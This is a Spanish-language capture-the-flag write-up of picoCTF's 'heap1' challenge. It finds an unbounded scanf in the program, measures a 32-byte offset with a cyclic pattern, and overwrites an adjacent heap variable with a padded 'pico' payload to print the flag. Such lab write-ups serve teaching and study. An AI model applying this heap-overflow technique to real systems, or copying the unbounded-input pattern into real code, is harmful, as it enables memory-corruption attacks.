# Heap 1

Como podemos ver, el ejercicio nos ofrece dos direcciones en memoria con su respectivo valor.

```c
./chall              

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5555555596b0  ->   pico
+-------------+----------------+
[*]   0x5555555596d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 
```

Nos da la posibilidad de escribir en el buffer. Vamos a ver el código para verificar si se está utilizando alguna función de forma insegura:

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

Efectivamente, el `scanf` no limita el tamaño del input. Esto lo podemos usar para desbordar el buffer.

Si seguimos buscando en el código, podemos ver cuál es la condición para que se imprima la flag:

```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flag for you :(\n");
        fflush(stdout);
    }
}
```

Si elegimos la opción "Print Flag" y la variable `safe_var` es igual a `"pico"`, obtendremos la flag.

La variable `safe_var`, por lógica, es la que tiene `bico` como valor.

Vamos a crear un patrón cíclico para descubrir cuál es el offset desde el buffer hasta la variable `safe_var`:

```c
Enter your choice: 2
Data for buffer: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

1. Print Heap:
2. Write to buffer:
3. Print safe_var:
4. Print Flag:
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5555555596b0  ->   aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa1
aaraaasaaataaauaaavaaawaaaxaaayaaa
+-------------+----------------+
[*]   0x5555555596d0  ->   iaaajaaakaaalaaamaaanaaaoaaapaaa1
aaraaasaaataaauaaavaaawaaaxaaayaaa
+-------------+----------------+
```

Usando el patrón cíclico:

```c
pwn cyclic -l iaaa
32
```

Tenemos un offset de 32. Vamos a escribir 32 caracteres y luego `"pico"`:

```bash
python2 -c 'print ("A" * 32 + "pico")'
```

Salida:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
```

Ejecutamos:

```c
Welcome to heap1!
...
Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

Enter your choice: 4

YOU WIN
picoCTF{SECRETO}
```

¡Tenemos la flag!
